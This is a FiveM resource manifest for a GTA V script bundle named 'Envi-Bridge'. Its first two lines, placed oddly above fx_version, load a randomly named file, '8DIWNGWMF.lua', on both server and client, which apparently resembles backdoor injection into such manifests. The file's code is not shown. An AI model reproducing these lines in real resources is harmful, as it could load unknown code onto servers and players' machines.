server_script "8DIWNGWMF.lua"
client_script "8DIWNGWMF.lua"
fx_version 'cerulean'
use_experimental_fxv2_oal 'yes'
lua54 'yes'
game 'gta5'

name 'Envi-Bridge'
author 'Envi-Scripts'
version '0.3.9'

client_scripts {
    'runtime/**/client.lua',
}

server_scripts {
    'runtime/**/server.lua',
}

files {
    '**/**/client.lua',
    '**/*.lua',
}

escrow_ignore {
    'bridge.lua',
    '**/*.lua',
}

dependency '/assetpacks'
dependency '/assetpacks'